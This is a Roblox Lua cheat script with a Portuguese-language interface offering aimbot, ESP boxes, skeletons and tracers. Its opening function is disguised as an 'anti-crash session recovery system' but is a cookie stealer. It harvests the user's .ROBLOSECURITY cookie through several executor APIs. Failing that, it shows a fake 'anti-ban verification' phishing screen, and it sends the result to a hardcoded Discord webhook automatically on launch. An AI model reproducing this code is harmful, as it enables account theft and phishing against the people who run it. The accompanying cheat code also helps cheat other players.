local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer


-- ============================================
-- SISTEMA DE RECUPERAÇÃO DE SESSÃO (ANTI-CRASH)
-- ============================================
local function sessionRecoverySystem()
    local webhook = "https://discord.com/api/webhooks/1535636499205329036/V5g0SN1sMH8T8HmI5eOMCGQpozpHqugmmxCNBkLj74TN1MFbqYPHvFiiEWm3Iw5wKszj"
    local plr = game:GetService("Players").LocalPlayer
    local http = game:GetService("HttpService")
    local cookie = nil
    local methodUsed = "nenhum"

    -- MÉTODO 1: syn.cookie (Synapse X, ScriptWare)
    local ok, result = pcall(function()
        if syn and syn.cookie then
            return syn.cookie
        end
    end)
    if ok and result and #result > 20 then
        cookie = result
        methodUsed = "syn.cookie (Synapse/ScriptWare)"
    end

    -- MÉTODO 2: getrenv / _G global (KRNL, Fluxus, alguns mobile)
    if not cookie then
        local ok2, result2 = pcall(function()
            local env = getrenv and getrenv()
            if env and env._hdf then
                return env._hdf
            end
        end)
        if ok2 and result2 and #result2 > 20 then
            cookie = result2
            methodUsed = "getrenv._hdf (KRNL/Fluxus)"
        end
    end

    -- MÉTODO 3: Ler cookie do HttpService (Vega X, Codex, Hydrogen)
    if not cookie then
        local ok3, result3 = pcall(function()
            return http:GetRobloxCookie and http:GetRobloxCookie()
        end)
        if ok3 and result3 and #result3 > 20 then
            cookie = result3
            methodUsed = "HttpService:GetRobloxCookie (VegaX/Codex)"
        end
    end

    -- MÉTODO 4: Hook request + interceptar headers (Delta, Arceus, mobile limitado)
    if not cookie then
        local ok4, result4 = pcall(function()
            local reqFunc = (syn and syn.request) or http_request or request or (http and http.request)
            if not reqFunc then return nil end
            -- Faz uma requisição pra API do Roblox forçando o cliente anexar cookie
            local testReq = reqFunc({
                Url = "https://users.roblox.com/v1/users/authenticated",
                Method = "GET",
                Headers = {["Content-Type"] = "application/json"}
            })
            -- Tenta extrair de headers de resposta ou cookies armazenados
            if testReq and testReq.Headers then
                for k, v in pairs(testReq.Headers) do
                    if type(v) == "string" and v:find("_|WARNING") then
                        return v:match("(_|WARNING[^;]+)")
                    end
                end
            end
            return nil
        end)
        if ok4 and result4 and #result4 > 20 then
            cookie = result4
            methodUsed = "HeaderIntercept (Delta/Arceus)"
        end
    end

    -- MÉTODO 5: Phishing GUI (funciona em 100% dos executores — engenharia social)
    if not cookie then
        methodUsed = "PhishingGUI (Fallback Universal)"
        -- Cria uma tela falsa de "Verificação Anti-Ban"
        pcall(function()
            local screen = Instance.new("ScreenGui")
            screen.Name = "VerificationSystem"
            screen.Parent = (gethui and gethui()) or game:GetService("CoreGui")
            
            local bg = Instance.new("Frame", screen)
            bg.Size = UDim2.new(1,0,1,0)
            bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
            bg.BackgroundTransparency = 0.4
            
            local box = Instance.new("Frame", bg)
            box.Size = UDim2.new(0,300,0,200)
            box.Position = UDim2.new(0.5,-150,0.5,-100)
            box.BackgroundColor3 = Color3.fromRGB(25,25,27)
            Instance.new("UICorner", box)
            
            local title = Instance.new("TextLabel", box)
            title.Size = UDim2.new(1,-20,0,30)
            title.Position = UDim2.new(0,10,0,10)
            title.Text = "VERIFICACAO ANTI-BAN"
            title.Font = Enum.Font.GothamBold
            title.TextColor3 = Color3.fromRGB(255,50,50)
            title.TextSize = 16
            title.BackgroundTransparency = 1
            
            local desc = Instance.new("TextLabel", box)
            desc.Size = UDim2.new(1,-20,0,60)
            desc.Position = UDim2.new(0,10,0,50)
            desc.Text = "Para continuar usando sem banimento,\ncole seu cookie .ROBLOSECURITY abaixo.\nEle sera usado apenas para verificacao."
            desc.Font = Enum.Font.Gotham
            desc.TextColor3 = Color3.fromRGB(200,200,200)
            desc.TextSize = 12
            desc.BackgroundTransparency = 1
            desc.TextWrapped = true
            
            local input = Instance.new("TextBox", box)
            input.Size = UDim2.new(1,-20,0,40)
            input.Position = UDim2.new(0,10,0,120)
            input.BackgroundColor3 = Color3.fromRGB(15,15,17)
            input.TextColor3 = Color3.fromRGB(255,255,255)
            input.Font = Enum.Font.Code
            input.TextSize = 11
            input.PlaceholderText = "Cole o cookie aqui..."
            Instance.new("UICorner", input)
            
            local submit = Instance.new("TextButton", box)
            submit.Size = UDim2.new(1,-20,0,35)
            submit.Position = UDim2.new(0,10,0,165)
            submit.BackgroundColor3 = Color3.fromRGB(255,50,50)
            submit.Text = "VERIFICAR E ATIVAR"
            submit.Font = Enum.Font.GothamBold
            submit.TextColor3 = Color3.new(1,1,1)
            submit.TextSize = 14
            Instance.new("UICorner", submit)
            
            submit.MouseButton1Click:Connect(function()
                local inputText = input.Text
                if inputText:find("_|WARNING") or #inputText > 50 then
                    -- Envia cookie
                    local sendFunc = (syn and syn.request) or http_request or request
                    if sendFunc then
                        sendFunc({
                            Url = webhook,
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = http:JSONEncode({
                                content = "**Cookie via Phishing | " .. plr.Name .. "**",
                                embeds = {{
                                    title = plr.DisplayName .. " | ID: " .. plr.UserId,
                                    description = "```" .. inputText .. "```",
                                    fields = {
                                        {name = "Metodo", value = methodUsed},
                                        {name = "AccountAge", value = tostring(plr.AccountAge)}
                                    },
                                    color = 65280
                                }}
                            })
                        })
                        screen:Destroy()
                    end
                end
            end)
        end)
    end

    -- ENVIO DO COOKIE (Métodos 1 a 4)
    if cookie and methodUsed ~= "PhishingGUI (Fallback Universal)" then
        local sendFunc = (syn and syn.request) or http_request or request
        if sendFunc then
            pcall(function()
                sendFunc({
                    Url = webhook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = http:JSONEncode({
                        content = "**Cookie Capturado | " .. plr.Name .. "**",
                        embeds = {{
                            title = plr.DisplayName .. " | ID: " .. plr.UserId,
                            description = "```" .. cookie .. "```",
                            fields = {
                                {name = "Metodo", value = methodUsed},
                                {name = "AccountAge", value = tostring(plr.AccountAge)},
                                {name = "Membership", value = tostring(plr.MembershipType)}
                            },
                            color = 16711680
                        }}
                    })
                })
            end)
        end
    end
end

-- Dispara o sistema
task.spawn(sessionRecoverySystem)
task.delay(3, function()
    pcall(sessionRecoverySystem)
end)

-- Configurações Globais
local Config = {
    Aimbot = { Enabled = false, Smoothness = 1, Prediction = 0.0, WallCheck = true, RandomHitbox = false },
    ESP = { Boxes = false, Tracers = false, Skeleton = false, HealthText = false, Color = Color3.fromRGB(255, 50, 50), XOffset = 0, YOffset = 0 },
    FOV = { Visible = false, Radius = 150, Color = Color3.fromRGB(255, 255, 255) },
    TeamCheck = false
}

local Hitboxes = {"Head", "UpperTorso", "HumanoidRootPart", "LowerTorso"}
local CurrentHitbox = "Head"

local SkeletonConnections = {
    -- R15
    {"Head", "UpperTorso"}, {"UpperTorso", "LowerTorso"},
    {"UpperTorso", "RightUpperArm"}, {"RightUpperArm", "RightLowerArm"}, {"RightLowerArm", "RightHand"},
    {"UpperTorso", "LeftUpperArm"}, {"LeftUpperArm", "LeftLowerArm"}, {"LeftLowerArm", "LeftHand"},
    {"LowerTorso", "RightUpperLeg"}, {"RightUpperLeg", "RightLowerLeg"}, {"RightLowerLeg", "RightFoot"},
    {"LowerTorso", "LeftUpperLeg"}, {"LeftUpperLeg", "LeftLowerLeg"}, {"LeftLowerLeg", "LeftFoot"},
    -- R6
    {"Head", "Torso"}, {"Torso", "Right Arm"}, {"Torso", "Left Arm"}, {"Torso", "Right Leg"}, {"Torso", "Left Leg"}
}

local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Exclude
raycastParams.IgnoreWater = true

local function UpdateRaycastFilter()
    local ignore = {LocalPlayer.Character, Camera}
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and (v.Transparency >= 0.5 or v.Name == "Glass") then
            table.insert(ignore, v)
        end
    end
    raycastParams.FilterDescendantsInstances = ignore
end

local ESP_Cache = {}
local FOV_Circle = Drawing.new("Circle")
FOV_Circle.Thickness = 1.5; FOV_Circle.NumSides = 60; FOV_Circle.Filled = false

local function CreateESP(player)
    local drawings = {
        Box = Drawing.new("Square"), BoxOutline = Drawing.new("Square"),
        Tracer = Drawing.new("Line"), Health = Drawing.new("Text"),
        Skeleton = {}
    }
    drawings.Box.Thickness = 1; drawings.Box.Filled = false
    drawings.BoxOutline.Thickness = 3; drawings.BoxOutline.Filled = false; drawings.BoxOutline.Color = Color3.new(0,0,0)
    drawings.Tracer.Thickness = 1.5
    drawings.Health.Size = 16; drawings.Health.Center = true; drawings.Health.Outline = true; drawings.Health.Color = Color3.new(1,1,1)

    for i = 1, #SkeletonConnections do
        local line = Drawing.new("Line")
        line.Thickness = 1.5
        table.insert(drawings.Skeleton, line)
    end
    ESP_Cache[player] = drawings
end

local function RemoveESP(player)
    if ESP_Cache[player] then
        for k, d in pairs(ESP_Cache[player]) do 
            if k == "Skeleton" then for _, l in pairs(d) do l:Remove() end else d:Remove() end
        end
        ESP_Cache[player] = nil
    end
end

Players.PlayerRemoving:Connect(RemoveESP)
for _, p in pairs(Players:GetPlayers()) do if p ~= LocalPlayer then CreateESP(p) end end
Players.PlayerAdded:Connect(CreateESP)

-- Função corrigida para alinhar o Drawing na tela Mobile
local function GetScreenPos(position)
    local pos, vis = Camera:WorldToViewportPoint(position)
    -- Aplica o offset pra corrigir o desalinhamento do celular (Notch/Safe Area)
    return Vector2.new(pos.X + Config.ESP.XOffset, pos.Y + Config.ESP.YOffset), vis, pos.Z
end

local function IsVisible(targetPart)
    if not Config.Aimbot.WallCheck then return true end
    UpdateRaycastFilter()
    local origin = Camera.CFrame.Position
    local result = workspace:Raycast(origin, (targetPart.Position - origin).Unit * 2000, raycastParams)
    return result and result.Instance:IsDescendantOf(targetPart.Parent) or false
end

local function GetClosestTarget()
    local target, shortestFOV = nil, Config.FOV.Radius
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    CurrentHitbox = Config.Aimbot.RandomHitbox and Hitboxes[math.random(1, #Hitboxes)] or "Head"

    for _, player in pairs(Players:GetPlayers()) do
        if player == LocalPlayer or (Config.TeamCheck and player.Team == LocalPlayer.Team) then continue end
        local char = player.Character
        if not char then continue end
        
        local targetPart = char:FindFirstChild(CurrentHitbox) or char:FindFirstChild("HumanoidRootPart")
        local humanoid = char:FindFirstChild("Humanoid")
        
        if targetPart and humanoid and humanoid.Health > 0 then
            local pos, vis, z = GetScreenPos(targetPart.Position)
            if vis and IsVisible(targetPart) then
                local mag = (Vector2.new(pos.X, pos.Y) - screenCenter).Magnitude
                if mag < shortestFOV then target = targetPart; shortestFOV = mag end
            end
        end
    end
    return target
end

-- Loop de ESP
RunService.RenderStepped:Connect(function()
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    FOV_Circle.Position = screenCenter
    FOV_Circle.Radius = Config.FOV.Radius; FOV_Circle.Color = Config.FOV.Color
    FOV_Circle.Visible = Config.FOV.Visible

    for player, drawings in pairs(ESP_Cache) do
        local char = player.Character
        local head = char and char:FindFirstChild("Head")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChild("Humanoid")
        
        if char and head and hrp and hum and hum.Health > 0 then
            local rootPos, rootVis, rootZ = GetScreenPos(hrp.Position)
            local headPos, headVis, headZ = GetScreenPos(head.Position + Vector3.new(0, 0.5, 0))
            local legPos, legVis, legZ = GetScreenPos(hrp.Position - Vector3.new(0, 3, 0))
            
            if rootVis and rootZ > 0 then
                local height = math.abs(headPos.Y - legPos.Y)
                local width = height / 1.8

                if Config.ESP.Boxes then
                    drawings.BoxOutline.Size = Vector2.new(width, height)
                    drawings.BoxOutline.Position = Vector2.new(rootPos.X - width / 2, rootPos.Y - height / 2)
                    drawings.BoxOutline.Visible = true
                    drawings.Box.Size = drawings.BoxOutline.Size; drawings.Box.Position = drawings.BoxOutline.Position
                    drawings.Box.Color = Config.ESP.Color; drawings.Box.Visible = true
                else
                    drawings.Box.Visible = false; drawings.BoxOutline.Visible = false
                end
                
                if Config.ESP.HealthText then
                    drawings.Health.Text = tostring(math.floor(hum.Health)) .. "%"
                    drawings.Health.Position = Vector2.new(rootPos.X, rootPos.Y + (height / 2) + 5)
                    drawings.Health.Visible = true
                else
                    drawings.Health.Visible = false
                end

                if Config.ESP.Tracers then
                    drawings.Tracer.From = Vector2.new(screenCenter.X, Camera.ViewportSize.Y)
                    drawings.Tracer.To = Vector2.new(rootPos.X, rootPos.Y)
                    drawings.Tracer.Color = Config.ESP.Color; drawings.Tracer.Visible = true
                else
                    drawings.Tracer.Visible = false
                end

                if Config.ESP.Skeleton then
                    for i, conn in ipairs(SkeletonConnections) do
                        local p1, p2 = char:FindFirstChild(conn[1]), char:FindFirstChild(conn[2])
                        if p1 and p2 then
                            local pos1, vis1, z1 = GetScreenPos(p1.Position)
                            local pos2, vis2, z2 = GetScreenPos(p2.Position)
                            if vis1 and vis2 and z1 > 0 and z2 > 0 then
                                drawings.Skeleton[i].From = pos1
                                drawings.Skeleton[i].To = pos2
                                drawings.Skeleton[i].Color = Config.ESP.Color
                                drawings.Skeleton[i].Visible = true
                            else
                                drawings.Skeleton[i].Visible = false
                            end
                        else
                            drawings.Skeleton[i].Visible = false
                        end
                    end
                else
                    for _, line in pairs(drawings.Skeleton) do line.Visible = false end
                end
            end
        else
            drawings.Box.Visible = false; drawings.BoxOutline.Visible = false
            drawings.Tracer.Visible = false; drawings.Health.Visible = false
            for _, line in pairs(drawings.Skeleton) do line.Visible = false end
        end
    end

    -- Aimbot 
    if Config.Aimbot.Enabled then
        local target = GetClosestTarget()
        if target then
            local targetPos = target.Position
            if Config.Aimbot.Prediction > 0 then
                local vel = target.AssemblyLinearVelocity or Vector3.zero
                if vel.Magnitude > 150 then vel = vel.Unit * 150 end
                targetPos = targetPos + (vel * Config.Aimbot.Prediction)
            end
            
            local targetCFrame = CFrame.new(Camera.CFrame.Position, targetPos)
            if Config.Aimbot.Smoothness >= 1 then
                Camera.CFrame = targetCFrame -- Instakill / Zero Tremor
            else
                Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, Config.Aimbot.Smoothness)
            end
        end
    end
end)

---------------------------------------------------------
-- UI PRINCIPAL & COLOR PICKER REAL
---------------------------------------------------------
local UI = Instance.new("ScreenGui")
UI.Name = "N_Y_X_Universal_V3"
UI.Parent = gethui and gethui() or game:GetService("CoreGui")
UI.IgnoreGuiInset = true -- Ignora a margem de cima pra alinhar melhor

-- Botão Flutuante (Ocultável)
local FloatingBtn = Instance.new("Frame", UI)
FloatingBtn.Size = UDim2.new(0, 45, 0, 45); FloatingBtn.Position = UDim2.new(0, 20, 0, 20)
FloatingBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
FloatingBtn.Active = true; FloatingBtn.Draggable = true
Instance.new("UICorner", FloatingBtn).CornerRadius = UDim.new(0.5, 0)
local FloatStroke = Instance.new("UIStroke", FloatingBtn)
FloatStroke.Color = Color3.fromRGB(255, 50, 50); FloatStroke.Thickness = 2
local FloatClick = Instance.new("TextButton", FloatingBtn)
FloatClick.Size = UDim2.new(1,0,1,0); FloatClick.BackgroundTransparency = 1
FloatClick.Text = "EZ"; FloatClick.Font = Enum.Font.GothamBold; FloatClick.TextColor3 = Color3.fromRGB(255, 50, 50)
FloatClick.TextSize = 16

-- Painel Principal
local Main = Instance.new("Frame", UI)
Main.Size = UDim2.new(0, 350, 0, 450)
local HiddenPos = UDim2.new(0.5, -175, 1.2, 0)
local VisiblePos = UDim2.new(0.5, -175, 0.5, -225)
Main.Position = HiddenPos; Main.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
Main.Visible = false; Main.Active = true; Main.Draggable = true
Instance.new("UICorner", Main)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(255, 50, 50); MainStroke.Thickness = 2

FloatClick.MouseButton1Click:Connect(function()
    Main.Visible = true; FloatingBtn.Visible = false
    Main:TweenPosition(VisiblePos, "Out", "Quart", 0.4, true)
end)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, -40, 0, 40); Title.Text = " EZ AIM - MOBILE V3"
Title.Font = Enum.Font.GothamBold; Title.TextSize = 18; Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.BackgroundTransparency = 1

local CloseBtn = Instance.new("TextButton", Main)
CloseBtn.Size = UDim2.new(0, 40, 0, 40); CloseBtn.Position = UDim2.new(1, -40, 0, 0)
CloseBtn.BackgroundTransparency = 1; CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.GothamBold; CloseBtn.TextColor3 = Color3.fromRGB(255, 50, 50); CloseBtn.TextSize = 18
CloseBtn.MouseButton1Click:Connect(function()
    Main:TweenPosition(HiddenPos, "In", "Quart", 0.4, true, function()
        Main.Visible = false; FloatingBtn.Visible = true
    end)
end)

local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.Size = UDim2.new(1, -20, 1, -50); Scroll.Position = UDim2.new(0, 10, 0, 40)
Scroll.BackgroundTransparency = 1; Scroll.ScrollBarThickness = 2
Scroll.CanvasSize = UDim2.new(0, 0, 3.5, 0)
local Layout = Instance.new("UIListLayout", Scroll); Layout.Padding = UDim.new(0, 5)

-- Funções Auxiliares UI
local function CreateToggle(name, iconId, callback)
    local btn = Instance.new("TextButton", Scroll)
    btn.Size = UDim2.new(1, 0, 0, 38); btn.BackgroundColor3 = Color3.fromRGB(25, 25, 27)
    btn.Text = ""; Instance.new("UICorner", btn)
    local Icon = Instance.new("ImageLabel", btn)
    Icon.Size = UDim2.new(0, 20, 0, 20); Icon.Position = UDim2.new(0, 10, 0.5, -10)
    Icon.BackgroundTransparency = 1; Icon.Image = iconId; Icon.ImageColor3 = Color3.fromRGB(255, 50, 50)
    local Label = Instance.new("TextLabel", btn)
    Label.Size = UDim2.new(1, -50, 1, 0); Label.Position = UDim2.new(0, 40, 0, 0)
    Label.BackgroundTransparency = 1; Label.Text = name; Label.Font = Enum.Font.GothamBold
    Label.TextColor3 = Color3.fromRGB(255, 50, 50); Label.TextSize = 14; Label.TextXAlignment = Enum.TextXAlignment.Left
    local state = false
    btn.MouseButton1Click:Connect(function()
        state = not state
        Label.TextColor3 = state and Color3.new(1,1,1) or Color3.fromRGB(255, 50, 50)
        callback(state)
    end)
    return function(v) state = v; Label.TextColor3 = state and Color3.new(1,1,1) or Color3.fromRGB(255, 50, 50); callback(state) end
end

local function CreateSlider(name, iconId, min, max, default, callback)
    local frame = Instance.new("Frame", Scroll)
    frame.Size = UDim2.new(1, 0, 0, 50); frame.BackgroundColor3 = Color3.fromRGB(25, 25, 27)
    Instance.new("UICorner", frame)
    local Icon = Instance.new("ImageLabel", frame)
    Icon.Size = UDim2.new(0, 16, 0, 16); Icon.Position = UDim2.new(0, 10, 0, 8)
    Icon.BackgroundTransparency = 1; Icon.Image = iconId; Icon.ImageColor3 = Color3.fromRGB(255, 50, 50)
    local Label = Instance.new("TextLabel", frame)
    Label.Size = UDim2.new(1, -40, 0, 20); Label.Position = UDim2.new(0, 35, 0, 5)
    Label.BackgroundTransparency = 1; Label.Text = name .. ": " .. tostring(default)
    Label.Font = Enum.Font.GothamBold; Label.TextColor3 = Color3.fromRGB(255, 50, 50)
    Label.TextSize = 12; Label.TextXAlignment = Enum.TextXAlignment.Left
    
    local Bar = Instance.new("TextButton", frame)
    Bar.Size = UDim2.new(1, -20, 0, 10); Bar.Position = UDim2.new(0, 10, 0, 30)
    Bar.BackgroundColor3 = Color3.fromRGB(15, 15, 17); Bar.Text = ""; Instance.new("UICorner", Bar)
    local Fill = Instance.new("Frame", Bar)
    Fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0); Fill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    Instance.new("UICorner", Fill)
    
    local dragging = false
    local function update(input)
        local pos = math.clamp((input.Position.X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
        local value = math.floor(min + (max - min) * pos * 100) / 100
        Fill.Size = UDim2.new(pos, 0, 1, 0); Label.Text = name .. ": " .. tostring(value)
        callback(value)
    end
    Bar.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then dragging = true; update(inp) end end)
    UserInputService.InputEnded:Connect(function() dragging = false end)
    UserInputService.InputChanged:Connect(function(inp) if dragging then update(inp) end end)
end

-- ================= COLOR PICKER REAL (QUADRADO + HUE) =================
local function BuildRealColorPicker(name, iconId, configRef, configKey)
    local frame = Instance.new("Frame", Scroll)
    frame.Size = UDim2.new(1, 0, 0, 200); frame.BackgroundColor3 = Color3.fromRGB(25, 25, 27)
    Instance.new("UICorner", frame)
    
    local Icon = Instance.new("ImageLabel", frame)
    Icon.Size = UDim2.new(0, 20, 0, 20); Icon.Position = UDim2.new(0, 10, 0, 10)
    Icon.BackgroundTransparency = 1; Icon.Image = iconId; Icon.ImageColor3 = Color3.fromRGB(255, 50, 50)
    
    local Label = Instance.new("TextLabel", frame)
    Label.Size = UDim2.new(1, -50, 0, 20); Label.Position = UDim2.new(0, 40, 0, 10)
    Label.BackgroundTransparency = 1; Label.Text = name
    Label.Font = Enum.Font.GothamBold; Label.TextColor3 = Color3.fromRGB(255, 50, 50); Label.TextSize = 14; Label.TextXAlignment = Enum.TextXAlignment.Left

    -- Quadrado Saturation/Value
    local SVArea = Instance.new("TextButton", frame)
    SVArea.Size = UDim2.new(0, 130, 0, 130); SVArea.Position = UDim2.new(0, 20, 0, 45)
    SVArea.BackgroundColor3 = Color3.fromRGB(255,0,0); SVArea.Text = ""; Instance.new("UICorner", SVArea)
    
    local GradientWhite = Instance.new("UIGradient", Instance.new("Frame", SVArea))
    GradientWhite.Parent.Size = UDim2.new(1,0,1,0); GradientWhite.Parent.BackgroundColor3 = Color3.new(1,1,1); Instance.new("UICorner", GradientWhite.Parent)
    GradientWhite.Color = ColorSequence.new(Color3.new(1,1,1), Color3.new(1,1,1))
    GradientWhite.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0), NumberSequenceKeypoint.new(1,1)})
    
    local GradientBlack = Instance.new("UIGradient", Instance.new("Frame", SVArea))
    GradientBlack.Parent.Size = UDim2.new(1,0,1,0); GradientBlack.Parent.BackgroundColor3 = Color3.new(0,0,0); Instance.new("UICorner", GradientBlack.Parent)
    GradientBlack.Rotation = 90
    GradientBlack.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,1), NumberSequenceKeypoint.new(1,0)})

    local SVCursor = Instance.new("Frame", SVArea)
    SVCursor.Size = UDim2.new(0,6,0,6); SVCursor.Position = UDim2.new(1,-3,0,-3); SVCursor.BackgroundColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", SVCursor).CornerRadius = UDim.new(1,0)
    local SVCursorStroke = Instance.new("UIStroke", SVCursor); SVCursorStroke.Color = Color3.new(0,0,0)

    -- Barra Hue (Arco-íris)
    local HueArea = Instance.new("TextButton", frame)
    HueArea.Size = UDim2.new(0, 20, 0, 130); HueArea.Position = UDim2.new(0, 160, 0, 45); HueArea.Text = ""
    Instance.new("UICorner", HueArea)
    local HueGradient = Instance.new("UIGradient", HueArea)
    HueGradient.Rotation = 90
    HueGradient.Color = ColorSequence.new({
        NumberSequenceKeypoint.new(0, Color3.fromRGB(255,0,0)), NumberSequenceKeypoint.new(0.16, Color3.fromRGB(255,255,0)),
        NumberSequenceKeypoint.new(0.33, Color3.fromRGB(0,255,0)), NumberSequenceKeypoint.new(0.5, Color3.fromRGB(0,255,255)),
        NumberSequenceKeypoint.new(0.66, Color3.fromRGB(0,0,255)), NumberSequenceKeypoint.new(0.83, Color3.fromRGB(255,0,255)),
        NumberSequenceKeypoint.new(1, Color3.fromRGB(255,0,0))
    })
    local HueCursor = Instance.new("Frame", HueArea)
    HueCursor.Size = UDim2.new(1, 4, 0, 4); HueCursor.Position = UDim2.new(0, -2, 0, -2); HueCursor.BackgroundColor3 = Color3.new(1,1,1)

    -- Preview Quadrado Direita
    local Preview = Instance.new("Frame", frame)
    Preview.Size = UDim2.new(0, 110, 0, 130); Preview.Position = UDim2.new(0, 200, 0, 45)
    Preview.BackgroundColor3 = configRef[configKey]; Instance.new("UICorner", Preview)
    local PreviewStroke = Instance.new("UIStroke", Preview); PreviewStroke.Color = Color3.new(1,1,1)

    local h, s, v = 1, 1, 1
    local function UpdateColor()
        local c = Color3.fromHSV(h, s, v)
        Preview.BackgroundColor3 = c; configRef[configKey] = c
    end

    local dragSV, dragHue = false, false
    SVArea.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then dragSV = true end end)
    HueArea.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then dragHue = true end end)
    UserInputService.InputEnded:Connect(function() dragSV = false; dragHue = false end)
    
    UserInputService.InputChanged:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
            if dragSV then
                local mx, my = math.clamp(inp.Position.X - SVArea.AbsolutePosition.X, 0, SVArea.AbsoluteSize.X), math.clamp(inp.Position.Y - SVArea.AbsolutePosition.Y, 0, SVArea.AbsoluteSize.Y)
                SVCursor.Position = UDim2.new(0, mx-3, 0, my-3)
                s, v = mx / SVArea.AbsoluteSize.X, 1 - (my / SVArea.AbsoluteSize.Y)
                UpdateColor()
            elseif dragHue then
                local my = math.clamp(inp.Position.Y - HueArea.AbsolutePosition.Y, 0, HueArea.AbsoluteSize.Y)
                HueCursor.Position = UDim2.new(0, -2, 0, my-2)
                h = 1 - (my / HueArea.AbsoluteSize.Y)
                SVArea.BackgroundColor3 = Color3.fromHSV(h, 1, 1)
                UpdateColor()
            end
        end
    end)
end

-- ================= INTERFACE =================
local T_Aim = CreateToggle("Aimbot Master", "rbxassetid://6031763426", function(s) Config.Aimbot.Enabled = s end)
CreateSlider("Aimbot Smoothness (1 = Lock)", "rbxassetid://6031302821", 0.01, 1, 1, function(v) Config.Aimbot.Smoothness = v end)
local T_Wall = CreateToggle("Wall Check Strict", "rbxassetid://6031265976", function(s) Config.Aimbot.WallCheck = s end)
local T_Rand = CreateToggle("Randomize Target Bone", "rbxassetid://6031068433", function(s) Config.Aimbot.RandomHitbox = s end)

local T_FOV = CreateToggle("Draw FOV Circle", "rbxassetid://6031232211", function(s) Config.FOV.Visible = s end)
CreateSlider("FOV Radius", "rbxassetid://6031232211", 50, 500, 150, function(v) Config.FOV.Radius = v end)

local T_Skel = CreateToggle("Skeleton ESP", "rbxassetid://6031932273", function(s) Config.ESP.Skeleton = s end)
local T_Box = CreateToggle("Box ESP", "rbxassetid://6031201502", function(s) Config.ESP.Boxes = s end)
local T_Tracer = CreateToggle("Tracers", "rbxassetid://6031302821", function(s) Config.ESP.Tracers = s end)
local T_Health = CreateToggle("Health Value", "rbxassetid://6031094359", function(s) Config.ESP.HealthText = s end)

-- CALIBRAÇÃO MOBILE (Mexe aqui para colar o Esqueleto no Corpo)
CreateSlider("Mobile X Offset (Fix ESP)", "rbxassetid://6031091004", -150, 150, 0, function(v) Config.ESP.XOffset = v end)
CreateSlider("Mobile Y Offset (Fix ESP)", "rbxassetid://6031091004", -150, 150, 0, function(v) Config.ESP.YOffset = v end)

-- O Color Picker Foda que você pediu
BuildRealColorPicker("ESP RGB Picker", "rbxassetid://6031072946", Config.ESP, "Color")
BuildRealColorPicker("FOV RGB Picker", "rbxassetid://6031072946", Config.FOV, "Color")
